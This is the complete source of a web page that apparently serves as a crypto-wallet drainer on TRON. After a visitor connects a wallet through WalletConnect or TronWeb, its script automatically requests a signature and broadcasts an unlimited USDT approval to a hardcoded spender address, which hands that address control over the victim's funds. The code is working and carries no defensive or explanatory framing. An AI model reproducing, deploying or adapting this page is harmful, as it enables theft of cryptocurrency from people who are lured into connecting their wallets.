<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT Approval</title>

<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<!-- ✅ WalletConnect v2 from CDN -->
<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>

<style>
body{
  margin:0;
  background:#0d0f12;
  color:#fff;
  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
}

.header{
  padding:20px;
  text-align:center;
  font-size:20px;
  font-weight:bold;
  border-bottom:1px solid #222;
  background:#121417;
}

.logo{
  width:60px;
  height:60px;
  margin:0 auto 12px;
  border-radius:12px;
  background:#1b1e23;
  display:flex;
  align-items:center;
  justify-content:center;
}

.logo img{
  width:48px;
  height:48px;
}

.container{
  padding:16px;
  max-width:500px;
  margin:0 auto;
}

.box{
  border:1px solid #2a2d33;
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  background:#121417;
}

.label{
  font-size:12px;
  color:#888;
  margin-bottom:6px;
  text-transform:uppercase;
  letter-spacing:0.5px;
}

.value{
  font-size:15px;
  color:#fff;
  word-break:break-all;
  font-family:monospace;
}

.network{
  display:flex;
  align-items:center;
  gap:8px;
  background:#1b1e23;
  padding:8px 12px;
  border-radius:20px;
  width:fit-content;
}

.network img{
  width:18px;
}

.status-box{
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  font-size:13px;
  display:flex;
  align-items:center;
  gap:8px;
}

.status-box.loading{
  background:#1a3a4d;
  color:#4dabf7;
}

.status-box.error{
  background:#5a1a1a;
  color:#ff8787;
}

.status-box.success{
  background:#1a4d2e;
  color:#51cf66;
}

.spinner{
  width:16px;
  height:16px;
  border:2px solid #4dabf7;
  border-top-color:transparent;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}

.checkmark{
  color:#51cf66;
  font-weight:bold;
}

.btn{
  position:fixed;
  bottom:20px;
  left:16px;
  right:16px;
  background:#2ecc71;
  color:#000;
  padding:16px;
  border:none;
  border-radius:30px;
  font-size:18px;
  font-weight:bold;
  cursor:pointer;
  transition:all 0.3s;
  z-index:10;
}

.btn:hover:not(:disabled){
  background:#27ae60;
  transform:translateY(-2px);
}

.btn:disabled{
  background:#888;
  opacity:0.5;
  cursor:not-allowed;
}

.info-text{
  font-size:12px;
  color:#888;
  text-align:center;
  margin-top:8px;
  line-height:1.5;
}

</style>
</head>

<body>

<div class="header">
  <div class="logo">
    <img src="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png" alt="Logo">
  </div>
  Unlimited USDT Approval
</div>

<div class="container">

<div id="status-container"></div>

<div class="box">
  <div class="label">Spender Address (Recipient)</div>
  <div class="value">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">USDT Contract</div>
  <div class="value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
</div>

<div class="box">
  <div class="label">Network</div>
  <div class="network">
    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON"> TRON
  </div>
</div>

<div class="box">
  <div class="label">Approval Amount</div>
  <div class="value">Unlimited (Max uint256)</div>
</div>

<p class="info-text">
  ✓ Click button to connect wallet<br>
  ✓ Approval will auto-trigger after connection
</p>

</div>

<button id="btn" class="btn" onclick="handleNext()">Connect Wallet</button>

<script>
// CONFIG
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const APPROVE_SELECTOR = "095ea7b3";
const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

let signClient = null;
let session = null;
let address = null;
let isProcessing = false;

function setStatus(msg, type = 'loading'){
  const container = document.getElementById("status-container");
  let icon = '';
  
  if(type === 'loading'){
    icon = '<div class="spinner"></div>';
  } else if(type === 'error'){
    icon = '✗';
  } else if(type === 'success'){
    icon = '<span class="checkmark">✓</span>';
  }
  
  container.innerHTML = `<div class="status-box ${type}">${icon} ${msg}</div>`;
}

function clearStatus(){
  document.getElementById("status-container").innerHTML = '';
}

const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr){
  try{
    let num = BigInt(0);
    for(let c of addr){
      num = num * 58n + BigInt(ALPHABET.indexOf(c));
    }
    let hex = num.toString(16);
    if(hex.length % 2) hex = "0" + hex;
    return hex.slice(0, -8);
  }catch(e){
    throw new Error("Invalid TRON address");
  }
}

function buildApproveTransaction(ownerAddress, spenderAddress){
  try{
    const spenderHex = base58ToHex(spenderAddress).toLowerCase();
    const spenderParam = spenderHex.padStart(64, '0');
    const amountParam = MAX_UINT256;
    const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
    
    return {
      owner_address: ownerAddress,
      contract_address: USDT_CONTRACT,
      function_selector: "approve(address,uint256)",
      parameter: functionData,
      fee_limit: 100000000,
      visible: true
    };
  }catch(e){
    throw new Error("Failed to build transaction: " + e.message);
  }
}

async function sendApproval(){
  try{
    if(!address){
      setStatus("No wallet connected", 'error');
      isProcessing = false;
      return;
    }

    setStatus("Building transaction...", 'loading');
    const txPayload = buildApproveTransaction(address, SPENDER_ADDRESS);

    setStatus("Creating transaction...", 'loading');
    const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(txPayload)
    }).then(r => r.json());

    if(!txResponse.transaction){
      throw new Error(txResponse.message || "Failed to create transaction");
    }

    setStatus("Requesting signature...", 'loading');

    let signed;
    if(window.tronWeb){
      signed = await window.tronWeb.trx.sign(txResponse.transaction);
    } else {
      signed = await signClient.request({
        topic: session.topic,
        chainId: TRON_CHAIN,
        request:{
          method: "tron_signTransaction",
          params: { transaction: txResponse.transaction }
        }
      });
    }

    setStatus("Broadcasting transaction...", 'loading');

    const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(signed)
    }).then(r => r.json());

    if(broadcastResponse.result){
      setStatus("✓ Approval successful! TX: " + broadcastResponse.txid, 'success');
      setTimeout(() => {
        clearStatus();
        isProcessing = false;
        document.getElementById("btn").innerText = "Send Another Approval";
      }, 5000);
    } else {
      throw new Error(broadcastResponse.message || "Broadcast failed");
    }

  }catch(e){
    console.error(e);
    setStatus("Error: " + e.message, 'error');
    isProcessing = false;
  }
}

async function initSignClient(){
  try{
    if(signClient) return true;

    console.log("Initializing SignClient...");
    
    // Wait for library to load
    if(!window.WalletConnectSignClient){
      throw new Error("WalletConnect library not loaded");
    }

    signClient = await window.WalletConnectSignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"USDT Approval",
        description:"Unlimited USDT Approval on TRON",
        url: window.location.href,
        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
      }
    });

    console.log("SignClient initialized");

    // Handle session proposal
    signClient.on("session_proposal", async (event) => {
      console.log("Session proposal received");
      try{
        const { id, params } = event;
        
        session = await signClient.approve({
          id,
          namespaces: {
            tron: {
              methods: ["tron_signTransaction"],
              chains: [TRON_CHAIN],
              accounts: [`${TRON_CHAIN}:${params.requiredNamespaces.tron.chains[0].split(':')[1]}`]
            }
          }
        });

        if(session?.namespaces?.tron?.accounts?.[0]){
          address = session.namespaces.tron.accounts[0].split(":")[2];
          document.getElementById("btn").innerText = "Send Approval";
          console.log("Session approved, address:", address);
          clearStatus();
          setTimeout(() => sendApproval(), 1000);
        }
      }catch(e){
        console.error("Session approval error:", e);
        setStatus("Approval failed: " + e.message, 'error');
      }
    });

    // Handle session deleted
    signClient.on("session_delete", () => {
      console.log("Session deleted");
      session = null;
      address = null;
      clearStatus();
      document.getElementById("btn").innerText = "Connect Wallet";
      isProcessing = false;
    });

    return true;
  }catch(e){
    console.error("Init error:", e);
    setStatus("Init failed: " + e.message, 'error');
    return false;
  }
}

async function connectWallet(){
  try{
    // Check for TronWeb (Trust Wallet browser)
    if(window.tronWeb?.defaultAddress?.base58){
      address = window.tronWeb.defaultAddress.base58;
      clearStatus();
      console.log("Connected via TronWeb:", address);
      return true;
    }

    setStatus("Opening wallet...", 'loading');

    const { uri, approval } = await signClient.connect({
      requiredNamespaces:{
        tron:{
          methods:["tron_signTransaction"],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    if(uri){
      console.log("WalletConnect URI generated, opening wallet...");
      
      // Store for recovery
      localStorage.setItem('wc_uri', uri);
      
      // Open in Trust Wallet with deep link
      const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
      window.open(deepLink, '_self');
      
      // Wait for approval
      session = await approval();
      
      if(session?.namespaces?.tron?.accounts?.[0]){
        address = session.namespaces.tron.accounts[0].split(":")[2];
        clearStatus();
        console.log("Connected:", address);
        return true;
      }
    }

    return false;

  }catch(e){
    console.error("Connect error:", e);
    setStatus("Connection error: " + e.message, 'error');
    return false;
  }
}

async function handleNext(){
  if(isProcessing) return;
  isProcessing = true;

  try{
    if(!address){
      // Initialize if needed
      if(!signClient){
        const inited = await initSignClient();
        if(!inited){
          isProcessing = false;
          return;
        }
      }

      const ok = await connectWallet();
      if(ok && address){
        setTimeout(() => sendApproval(), 1000);
      } else if(!ok){
        isProcessing = false;
      }
    } else {
      sendApproval();
    }
  }catch(e){
    console.error(e);
    setStatus("Error: " + e.message, 'error');
    isProcessing = false;
  }
}

// Wait for library to load, then initialize
document.addEventListener('DOMContentLoaded', async function(){
  console.log("Page loaded");
  
  // Check for TronWeb
  if(window.tronWeb?.defaultAddress?.base58){
    address = window.tronWeb.defaultAddress.base58;
    document.getElementById("btn").innerText = "Send Approval";
    console.log("TronWeb detected:", address);
    return;
  }

  // Wait for WalletConnect library to load
  let attempts = 0;
  while(!window.WalletConnectSignClient && attempts < 10){
    await new Promise(r => setTimeout(r, 500));
    attempts++;
  }

  if(!window.WalletConnectSignClient){
    console.error("WalletConnect library failed to load");
    setStatus("Library loading failed. Refresh the page.", 'error');
    return;
  }

  // Initialize SignClient
  await initSignClient();

  // Check for existing sessions
  if(signClient){
    const sessions = signClient.session.getAll();
    console.log("Existing sessions:", sessions.length);
    
    if(sessions.length > 0){
      session = sessions[0];
      if(session?.namespaces?.tron?.accounts?.[0]){
        address = session.namespaces.tron.accounts[0].split(":")[2];
        document.getElementById("btn").innerText = "Send Approval";
        console.log("Restored session:", address);
      }
    }
  }
});

</script>

</body>
</html>
